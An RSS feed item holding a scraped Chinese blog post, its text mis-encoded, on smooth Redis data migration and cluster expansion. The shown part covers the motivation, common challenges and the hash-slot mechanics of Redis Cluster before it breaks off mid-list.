#828182;}</style>]]></description></item><item>    <title><![CDATA[Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹å®æˆ˜ï¼šå¹³æ»‘æ‰©å±•çš„æŠ€æœ¯æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7595311405751189550</link>    <guid>https://juejin.cn/post/7595311405751189550</guid>    <pubDate>2026-01-15T07:05:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595311405751189550" data-draft-id="7490830568009367567" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹å®æˆ˜ï¼šå¹³æ»‘æ‰©å±•çš„æŠ€æœ¯æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="Redis,æ•°æ®åº“,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-15T07:05:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥"/> <meta itemprop="url" content="https://juejin.cn/user/446863555701561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹å®æˆ˜ï¼šå¹³æ»‘æ‰©å±•çš„æŠ€æœ¯æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/446863555701561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:05:24.000Z" title="Thu Jan 15 2026 07:05:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ–‡ç« å¼•è¨€</h2>
<p>æƒ³è±¡ä¸€ä¸‹è¿™æ ·çš„åœºæ™¯ï¼šä½ çš„Redisé›†ç¾¤æ­£åœ¨ä¸ºä¸€ä¸ªå¿«é€Ÿå¢é•¿çš„ä¸šåŠ¡æä¾›ç¼“å­˜æ”¯æŒï¼Œæ¯å¤©æœ‰æˆåƒä¸Šä¸‡çš„ç”¨æˆ·è¯·æ±‚èœ‚æ‹¥è€Œè‡³ã€‚ç„¶è€Œï¼Œéšç€æµé‡æ¿€å¢ï¼Œçƒ­ç‚¹Keyçš„è®¿é—®å‹åŠ›è®©å»¶è¿Ÿé£™å‡ï¼Œå•èŠ‚ç‚¹çš„å†…å­˜å’ŒCPUèµ„æºä¹Ÿé€æ¸æ‰è¥Ÿè§è‚˜ã€‚ä¸šåŠ¡è´Ÿè´£äººæ‰¾åˆ°ä½ ï¼Œé—®ï¼šâ€œèƒ½ä¸èƒ½åœ¨ä¸å½±å“çº¿ä¸ŠæœåŠ¡çš„æƒ…å†µä¸‹ï¼ŒæŠŠRedisæ‰©å®¹åˆ°åŒå€è§„æ¨¡ï¼Ÿâ€ä½ è„‘æµ·ä¸­æµ®ç°å‡ºå‡ ä¸ªé—®é¢˜ï¼šæ•°æ®æ€ä¹ˆè¿ç§»ï¼ŸæœåŠ¡èƒ½ä¸èƒ½ä¸åœæœï¼Ÿè¿ç§»è¿‡ç¨‹ä¸­ä¼šä¸ä¼šä¸¢æ•°æ®ï¼Ÿè¿™æ­£æ˜¯Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹çš„å…¸å‹æŒ‘æˆ˜ã€‚</p>
<p>åœ¨ä¸­å°å‹é¡¹ç›®ä¸­ï¼ŒRedisä½œä¸ºé«˜æ€§èƒ½çš„å†…å­˜æ•°æ®åº“ï¼Œå‡ ä¹æ˜¯ç¼“å­˜å’Œä¼šè¯å­˜å‚¨çš„â€œæ ‡é…â€ã€‚ä½†éšç€ä¸šåŠ¡è§„æ¨¡æ‰©å¤§ï¼Œå®ƒçš„ç—›ç‚¹ä¹Ÿé€æ¸æš´éœ²ï¼šå•èŠ‚ç‚¹æ€§èƒ½ç“¶é¢ˆå¯¼è‡´QPSå—é™ã€æ•°æ®åˆ†å¸ƒä¸å‡å¼•å‘çƒ­ç‚¹é—®é¢˜ã€è¿ç§»æ—¶æœåŠ¡ä¸å¯ç”¨è®©è¿ç»´äººå‘˜å¤´ç–¼ä¸å·²ã€‚æˆ‘æ›¾åœ¨ä¸€æ¬¡é¡¹ç›®ä¸­é‡åˆ°è¿‡ç±»ä¼¼æƒ…å†µâ€”â€”ç”±äºæ—©æœŸæœªåˆç†è§„åˆ’é›†ç¾¤ï¼Œå¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹è´Ÿè½½è¿‡é«˜ï¼Œä¸šåŠ¡é«˜å³°æœŸå»¶è¿Ÿé«˜è¾¾æ•°ç™¾æ¯«ç§’ï¼Œæœ€ç»ˆä¸å¾—ä¸åœ¨å‡Œæ™¨çª—å£æœŸç¡¬ç€å¤´çš®è¿ç§»æ•°æ®ã€‚é‚£æ¬¡ç»å†è®©æˆ‘æ·±åˆ»è®¤è¯†åˆ°ï¼ŒRedisçš„æ‰©å®¹å’Œè¿ç§»ç»ä¸æ˜¯ç®€å•çš„â€œåŠ æœºå™¨â€æ“ä½œï¼Œè€Œæ˜¯éœ€è¦ç§‘å­¦è§„åˆ’å’Œå®æˆ˜éªŒè¯çš„æŠ€æœ¯æ´»ã€‚</p>
<p>æœ¬æ–‡çš„ç›®æ ‡ï¼Œå°±æ˜¯å¸¦ä½ èµ°è¿›Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹çš„å®æˆ˜ä¸–ç•Œã€‚æˆ‘å°†åˆ†äº«ä¸€å¥—ç»è¿‡é¡¹ç›®éªŒè¯çš„å¹³æ»‘æ‰©å±•æ–¹æ¡ˆï¼Œå‰–ææ ¸å¿ƒæŠ€æœ¯ç»†èŠ‚ï¼Œå¹¶ç»“åˆçœŸå®æ¡ˆä¾‹å’Œè¸©å‘ç»éªŒï¼Œå¸®åŠ©ä½ æŒæ¡è¿™é¡¹å…³é”®æŠ€èƒ½ã€‚æ— è®ºä½ æ˜¯æƒ³ä»å•æœºRediså‡çº§åˆ°é›†ç¾¤æ¨¡å¼ï¼Œè¿˜æ˜¯éœ€è¦ä¸ºç°æœ‰é›†ç¾¤åŠ¨æ€æ‰©å®¹ï¼Œè¿™ç¯‡æ–‡ç« éƒ½èƒ½ä¸ºä½ æä¾›æ¸…æ™°çš„æ€è·¯å’Œå¯æ“ä½œçš„æ­¥éª¤ã€‚æ–‡ç« é¢å‘æœ‰1-2å¹´Rediså¼€å‘ç»éªŒçš„å¼€å‘è€…ï¼Œå¦‚æœä½ å·²ç»ç†Ÿæ‚‰Redisçš„åŸºæœ¬æ“ä½œï¼ˆå¦‚Key-Valueå­˜å‚¨ã€ä¸»ä»å¤åˆ¶ï¼‰ï¼Œä½†å¯¹é›†ç¾¤è¿ç§»å’Œæ‰©å®¹è¿˜æ„Ÿåˆ°æ— ä»ä¸‹æ‰‹ï¼Œé‚£ä¹ˆè¿™æ­£æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„å†…å®¹ã€‚</p>
<p>ä»ä¸ºä»€ä¹ˆè¦è¿ç§»ä¸æ‰©å®¹ï¼Œåˆ°å…·ä½“çš„å®æ–½æ­¥éª¤ï¼Œå†åˆ°ä¼˜åŒ–ä¸æ³¨æ„äº‹é¡¹ï¼Œæˆ‘ä»¬å°†ä¸€æ­¥æ­¥è§£é”Rediså¹³æ»‘æ‰©å±•çš„ç§˜å¯†ã€‚å‡†å¤‡å¥½äº†å—ï¼Ÿè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€Redisè¿ç§»ä¸æ‰©å®¹çš„èƒŒæ™¯ä¸æŒ‘æˆ˜</h2>
<h3 data-id="heading-2">1.1 ä¸ºä»€ä¹ˆéœ€è¦è¿ç§»ä¸æ‰©å®¹ï¼Ÿ</h3>
<p>Redisä¹‹æ‰€ä»¥æˆä¸ºå¼€å‘è€…çš„â€œå¿ƒå¤´å¥½â€ï¼Œç¦»ä¸å¼€å®ƒçš„é«˜æ€§èƒ½å’Œç®€å•æ˜“ç”¨ã€‚ä½†éšç€ä¸šåŠ¡å¢é•¿ï¼Œè¿™ç§â€œç¾å¥½â€ä¹Ÿä¼šé¢ä¸´è€ƒéªŒã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªç”µå•†å¹³å°çš„è®¢å•ç¼“å­˜ç³»ç»Ÿï¼ŒåˆæœŸæ—¥å‡QPSåªæœ‰å‡ åƒï¼Œå•èŠ‚ç‚¹Redisè¶³ä»¥èƒœä»»ã€‚å¯ä¸€æ—¦è¿›å…¥ä¿ƒé”€å­£ï¼ŒQPSæš´æ¶¨åˆ°å‡ ä¸‡ç”šè‡³å‡ åä¸‡ï¼Œå•èŠ‚ç‚¹çš„å†…å­˜å®¹é‡å’Œè®¡ç®—èƒ½åŠ›å°±æˆäº†æ‹¦è·¯è™ã€‚æ•°æ®é‡è†¨èƒ€ã€æµé‡å‹åŠ›æ¿€å¢ã€å•å®ä¾‹çš„CPUå’Œç½‘ç»œIOç“¶é¢ˆï¼Œè¿™äº›é—®é¢˜éƒ½åœ¨é€¼è¿«æˆ‘ä»¬æ€è€ƒï¼šå¦‚ä½•è®©Redisè·Ÿä¸Šä¸šåŠ¡çš„æ­¥ä¼ï¼Ÿ</p>
<p>é™¤äº†æ€§èƒ½éœ€æ±‚ï¼Œé«˜å¯ç”¨æ€§å’Œå®¹é”™æ€§ä¹Ÿæ˜¯è¿ç§»ä¸æ‰©å®¹çš„é©±åŠ¨åŠ›ã€‚å•æœºRedisä¸€æ—¦å®•æœºï¼ŒæœåŠ¡å°±å½»åº•ä¸å¯ç”¨ï¼›è€Œä¸»ä»æ¶æ„è™½èƒ½ç¼“è§£éƒ¨åˆ†å‹åŠ›ï¼Œä½†ä¸»èŠ‚ç‚¹æ•…éšœæ—¶çš„åˆ‡æ¢æˆæœ¬å’Œæ•°æ®ä¸€è‡´æ€§é£é™©ä¾ç„¶å­˜åœ¨ã€‚é›†ç¾¤åŒ–æˆä¸ºå¿…ç„¶é€‰æ‹©ï¼Œå®ƒä¸ä»…èƒ½æ°´å¹³æ‰©å±•æ€§èƒ½ï¼Œè¿˜èƒ½é€šè¿‡å¤šèŠ‚ç‚¹åˆ†æ‹…é£é™©ã€‚è¿™å°±åƒä»ç‹¬æœ¨æ¡¥å‡çº§åˆ°å¤šè½¦é“é«˜é€Ÿå…¬è·¯ï¼Œæ—¢æå‡äº†é€šè¡Œèƒ½åŠ›ï¼Œåˆå¢å¼ºäº†ç¨³å®šæ€§ã€‚</p>
<h3 data-id="heading-3">1.2 å¸¸è§æŒ‘æˆ˜</h3>
<p>ç„¶è€Œï¼ŒRedisçš„è¿ç§»ä¸æ‰©å®¹å¹¶ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œå®ƒä¼´éšç€å‡ ä¸ªæ£˜æ‰‹æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>æ•°æ®ä¸€è‡´æ€§</strong>ï¼šè¿ç§»è¿‡ç¨‹ä¸­ï¼Œå¦‚ä½•ç¡®ä¿æ•°æ®æ—¢ä¸ä¸¢å¤±ä¹Ÿä¸é‡å¤ï¼Ÿè¿™å°±å¥½æ¯”æ¬å®¶æ—¶ï¼Œæ—¢è¦ä¿è¯æ¯ä»¶å®¶å…·éƒ½å¸¦èµ°ï¼Œåˆä¸èƒ½å¤šå¸¦ä¸€å¥—æ²™å‘ã€‚</li>
<li><strong>æœåŠ¡å¯ç”¨æ€§</strong>ï¼šä¸šåŠ¡ä¸èƒ½åœï¼Œè¿ç§»å´è¦åŠ¨â€œå‘½æ ¹å­â€æ•°æ®ï¼Œå¦‚ä½•åšåˆ°ä¸åœæœï¼Ÿè¿™æ˜¯å¯¹æŠ€æœ¯æ–¹æ¡ˆå’Œæ‰§è¡Œèƒ½åŠ›çš„åŒé‡è€ƒéªŒã€‚</li>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šè¿ç§»å’Œæ‰©å®¹éš¾å…å ç”¨èµ„æºï¼Œå¦‚ä½•å°†å¯¹çº¿ä¸Šä¸šåŠ¡çš„å½±å“é™åˆ°æœ€ä½ï¼Ÿæ²¡æœ‰äººå¸Œæœ›å› ä¸ºä¸€æ¬¡æ‰©å®¹ï¼Œè®©ç”¨æˆ·ä½“éªŒâ€œè·³æ°´â€ã€‚</li>
</ul>
<p>è¿™äº›æŒ‘æˆ˜çœ‹ä¼¼ç®€å•ï¼Œå´éšè—ç€æ— æ•°ç»†èŠ‚ã€‚æ¯”å¦‚ï¼Œæ§½ä½åˆ†é…ä¸å½“å¯èƒ½å¯¼è‡´æ•°æ®å€¾æ–œï¼Œç½‘ç»œæŠ–åŠ¨å¯èƒ½ä¸­æ–­è¿ç§»ï¼Œå®¢æˆ·ç«¯é…ç½®æœªåŠæ—¶æ›´æ–°å¯èƒ½å¼•å‘è¯·æ±‚å¤±è´¥ã€‚è§£å†³è¿™äº›é—®é¢˜ï¼Œéœ€è¦æŠ€æœ¯å’Œç»éªŒçš„åŒé‡åŠ æŒã€‚</p>
<h3 data-id="heading-4">1.3 æˆ‘çš„ç»éªŒæ•™è®­</h3>
<p>æˆ‘æ›¾åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­è¸©è¿‡å‘ã€‚é‚£æ˜¯ä¸€ä¸ªå®æ—¶æ¨èç³»ç»Ÿï¼ŒåˆæœŸä½¿ç”¨3èŠ‚ç‚¹Redisä¸»ä»æ¶æ„ï¼Œæ•°æ®é‡ä¸å¤§æ—¶è¿è¡Œè‰¯å¥½ã€‚ä½†éšç€ç”¨æˆ·å¢é•¿ï¼Œçƒ­ç‚¹Keyé›†ä¸­åœ¨æŸä¸ªèŠ‚ç‚¹ï¼Œå»¶è¿Ÿé—®é¢˜é¢‘å‘ã€‚æˆ‘ä»¬å†³å®šè¿ç§»åˆ°Redis Clusterï¼Œå´ä½ä¼°äº†è§„åˆ’çš„é‡è¦æ€§ã€‚æ²¡æœ‰æå‰åˆ†æKeyåˆ†å¸ƒï¼Œç›´æ¥å¹³å‡åˆ†é…æ§½ä½ï¼Œç»“æœè¿ç§»åçƒ­ç‚¹é—®é¢˜ä¾ç„¶å­˜åœ¨ã€‚åæ¥é€šè¿‡æ—¥å¿—åˆ†æï¼Œæ‰å‘ç°éƒ¨åˆ†Keyçš„è®¿é—®é¢‘ç‡è¿œè¶…é¢„æœŸï¼Œæœ€ç»ˆè°ƒæ•´äº†æ§½ä½åˆ†å¸ƒå¹¶ä¼˜åŒ–äº†Keyè®¾è®¡ï¼Œæ‰è§£å†³é—®é¢˜ã€‚è¿™æ¬¡æ•™è®­å‘Šè¯‰æˆ‘ï¼š<strong>è¿ç§»ä¸æ‰©å®¹ä¸æ˜¯ç®€å•çš„æŠ€æœ¯æ“ä½œï¼Œè€Œæ˜¯å¯¹ä¸šåŠ¡ç†è§£å’Œç³»ç»Ÿè§„åˆ’çš„ç»¼åˆè€ƒéªŒ</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-5">è¿‡æ¸¡åˆ°ä¸‹ä¸€ç« </h3>
<p>äº†è§£äº†è¿ç§»ä¸æ‰©å®¹çš„èƒŒæ™¯å’ŒæŒ‘æˆ˜åï¼Œä½ å¯èƒ½å¥½å¥‡ï¼šåˆ°åº•æœ‰å“ªäº›æŠ€æœ¯æ–¹æ¡ˆèƒ½è®©æˆ‘ä»¬ä¼˜é›…åœ°å®Œæˆè¿™ä¸€è¿‡ç¨‹ï¼Ÿåˆ«æ€¥ï¼Œä¸‹ä¸€èŠ‚å°†ä¸ºä½ æ­å¼€Rediså¹³æ»‘æ‰©å±•çš„æŠ€æœ¯é¢çº±ã€‚æˆ‘ä»¬å°†ä»Redis Clusterçš„æ ¸å¿ƒæœºåˆ¶å…¥æ‰‹ï¼Œå‰–æå®ç°æ— æ„ŸçŸ¥æ‰©å®¹çš„å…³é”®æ–¹æ³•ï¼Œå¹¶å¯¹æ¯”å…¶ä»–æ–¹æ¡ˆçš„ä¼˜åŠ£ã€‚å‡†å¤‡å¥½è¿æ¥ä¸€åœºæŠ€æœ¯ç››å®´å§ï¼</p>
<hr/>
<h2 data-id="heading-6">äºŒã€å¹³æ»‘æ‰©å±•çš„æŠ€æœ¯æ–¹æ¡ˆæ¦‚è§ˆ</h2>
<p>åœ¨è§£å†³äº†â€œä¸ºä»€ä¹ˆéœ€è¦è¿ç§»ä¸æ‰©å®¹â€çš„ç–‘é—®åï¼Œæˆ‘ä»¬è‡ªç„¶è¦é—®ï¼šæœ‰å“ªäº›æŠ€æœ¯æ–¹æ¡ˆèƒ½è®©æˆ‘ä»¬æ—¢å¹³ç¨³åˆé«˜æ•ˆåœ°å®Œæˆè¿™ä¸€ä»»åŠ¡ï¼ŸRedisä½œä¸ºä¸€ä¸ªæˆç†Ÿçš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œæä¾›äº†åŸç”Ÿçš„é›†ç¾¤æ¨¡å¼ï¼ˆRedis Clusterï¼‰ï¼Œå®ƒå°±åƒä¸€è¾†ç²¾å¿ƒè®¾è®¡çš„â€œè¿è¾“è½¦â€ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬æŠŠæ•°æ®ä»æ—§èŠ‚ç‚¹å®‰å…¨æ¬åˆ°æ–°èŠ‚ç‚¹ï¼Œè¿˜èƒ½åŠ¨æ€è°ƒæ•´â€œè½¦é“â€ä»¥é€‚åº”ä¸šåŠ¡å¢é•¿ã€‚è¿™ä¸€ç« ï¼Œæˆ‘å°†å¸¦ä½ æ·±å…¥Redis Clusterçš„æ ¸å¿ƒæœºåˆ¶ï¼Œå‰–æå¹³æ»‘æ‰©å±•çš„å…³é”®æŠ€æœ¯ï¼Œå¹¶å¯¹æ¯”å…¶ä»–æ–¹æ¡ˆçš„ä¼˜åŠ£ï¼Œå¸®ä½ å»ºç«‹å…¨å±€è§†è§’ã€‚</p>
<h3 data-id="heading-7">2.1 Redis Clusterçš„æ ¸å¿ƒæœºåˆ¶</h3>
<p>Redis Clusteræ˜¯Rediså®˜æ–¹æ¨å‡ºçš„åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆï¼Œå®ƒé€šè¿‡æ•°æ®åˆ†ç‰‡å’Œæ§½ä½ç®¡ç†å®ç°æ°´å¹³æ‰©å±•ã€‚ä»¥ä¸‹æ˜¯å®ƒçš„æ ¸å¿ƒè®¾è®¡ï¼š</p>
<ul>
<li><strong>16384ä¸ªæ§½ä½çš„è®¾è®¡ä¸åˆ†é…</strong>ï¼šRedis Clusterå°†æ•°æ®ç©ºé—´åˆ’åˆ†ä¸º16384ä¸ªå“ˆå¸Œæ§½ï¼ˆHash Slotï¼‰ï¼Œæ¯ä¸ªæ§½è´Ÿè´£å­˜å‚¨ä¸€éƒ¨åˆ†Keyã€‚æ§½ä½å°±åƒå¿«é€’åˆ†æ‹£ä¸­å¿ƒçš„æ ¼å­ï¼Œæ¯ä¸ªæ ¼å­éƒ½æœ‰æ˜ç¡®çš„å½’å±èŠ‚ç‚¹ã€‚</li>
<li><strong>å“ˆå¸Œæ§½ä¸èŠ‚ç‚¹æ˜ å°„</strong>ï¼šé€šè¿‡CRC16ç®—æ³•è®¡ç®—Keyçš„å“ˆå¸Œå€¼ï¼Œå†å¯¹16384å–æ¨¡ï¼Œç¡®å®šKeyæ‰€å±çš„æ§½ä½ã€‚èŠ‚ç‚¹åˆ™é€šè¿‡é…ç½®ç»‘å®šè‹¥å¹²æ§½ä½ï¼Œå®ç°æ•°æ®åˆ†å¸ƒã€‚</li>
<li><strong>æ•°æ®åˆ†ç‰‡çš„ä¼˜åŠ¿</strong>ï¼šåˆ†ç‰‡è®©æ•°æ®ä¸å†é›†ä¸­äºå•ä¸€èŠ‚ç‚¹ï¼Œè€Œæ˜¯åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹å¹¶è¡Œå¤„ç†ï¼Œæå¤§æå‡äº†ååé‡å’Œå®¹é‡ã€‚</li>
</ul>
<p>ä¸‹å›¾ç®€å•å±•ç¤ºäº†æ§½ä½ä¸èŠ‚ç‚¹çš„å…³ç³»ï¼š</p>
<pre><code class="hljs language-rust" lang="rust">+-------------------+
| æ§½ä½ <span class="hljs-number">0</span>-<span class="hljs-number">5460</span>  <span class="hljs-punctuation">-&gt;</span> èŠ‚ç‚¹ A |
| æ§½ä½ <span class="hljs-number">5461</span>-<span class="hljs-number">10922</span> <span class="hljs-punctuation">-&gt;</span> èŠ‚ç‚¹ B |
| æ§½ä½ <span class="hljs-number">10923</span>-<span class="hljs-number">16383</span> <span class="hljs-punctuation">-&gt;</span> èŠ‚ç‚¹ C |
+-------------------+
</code></pre>
<p>è¿™ç§è®¾è®¡ä¸ºæ‰©å®¹æä¾›äº†åŸºç¡€ï¼šåªéœ€å°†éƒ¨åˆ†æ§½ä½ä»æ—§èŠ‚ç‚¹è¿ç§»åˆ°æ–°èŠ‚ç‚¹ï¼Œå°±èƒ½å®ç°åŠ¨æ€æ‰©å±•ã€‚</p>
<h3 data-id="heading-8">2.2 å¹³æ»‘æ‰©å±•çš„å…³é”®æŠ€æœ¯</h3>
<p>Redis Clusterçš„å¹³æ»‘æ‰©å±•ä¾èµ–ä»¥ä¸‹æ ¸å¿ƒæŠ€æœ¯ï¼Œå®ƒä»¬æ˜¯å®ç°â€œä¸åœæœè¿ç§»â€çš„å…³é”®ï¼š</p>
<ul>
<li><strong>åœ¨çº¿æ§½è¿ç§»ï¼ˆ<code>CLUSTER SETSLOT</code>ï¼‰</strong>ï¼šé€šè¿‡å‘½ä»¤åŠ¨æ€è°ƒæ•´æ§½ä½çš„å½’å±ï¼Œæ¯”å¦‚å°†æ§½ä½5461ä»èŠ‚ç‚¹Aè¿ç§»åˆ°èŠ‚ç‚¹Bã€‚è¿ç§»è¿‡ç¨‹ä¸­ï¼Œæ—§èŠ‚ç‚¹ä»å¯å“åº”è¯·æ±‚ï¼Œç›´åˆ°æ•°æ®å®Œå…¨åŒæ­¥ã€‚</li>
<li><strong>æ•°æ®è¿ç§»å·¥å…·ï¼ˆå¦‚<code>redis-cli --cluster</code>ï¼‰</strong>ï¼šå®˜æ–¹å·¥å…·æ”¯æŒè‡ªåŠ¨åŒ–è¿ç§»ï¼Œç®€åŒ–æ“ä½œã€‚ä¾‹å¦‚ï¼Œ<code>redis-cli --cluster rebalance</code>èƒ½æ ¹æ®èŠ‚ç‚¹è´Ÿè½½é‡æ–°åˆ†é…æ§½ä½ã€‚</li>
<li><strong>åŒå†™ä¸æ¸è¿›å¼åˆ‡æ¢</strong>ï¼šåœ¨è¿ç§»æœŸé—´ï¼Œå®¢æˆ·ç«¯å¯¹æ—§èŠ‚ç‚¹å’Œæ–°èŠ‚ç‚¹åŒæ—¶å†™å…¥æ•°æ®ï¼Œç¡®ä¿ä¸€è‡´æ€§ï¼›å®Œæˆåé€æ­¥åˆ‡æ¢è¯»å†™æµé‡ã€‚</li>
</ul>
<p>è¿™äº›æŠ€æœ¯å°±åƒä¸€åœºç²¾å¯†çš„â€œæ¥åŠ›èµ›â€ï¼šæ§½ä½è¿ç§»è´Ÿè´£ä¼ é€’â€œæ¥åŠ›æ£’â€ï¼Œå·¥å…·æä¾›è‡ªåŠ¨åŒ–æ”¯æŒï¼ŒåŒå†™ç­–ç•¥ç¡®ä¿â€œé€‰æ‰‹â€é—´çš„æ— ç¼è¡”æ¥ã€‚</p>
<h3 data-id="heading-9">2.3 æ–¹æ¡ˆä¼˜åŠ¿ä¸ç‰¹è‰²</h3>
<p>Redis Clusterçš„å¹³æ»‘æ‰©å±•æ–¹æ¡ˆæœ‰å‡ ä¸ªæ˜¾è‘—ä¼˜ç‚¹ï¼š</p>
<ul>
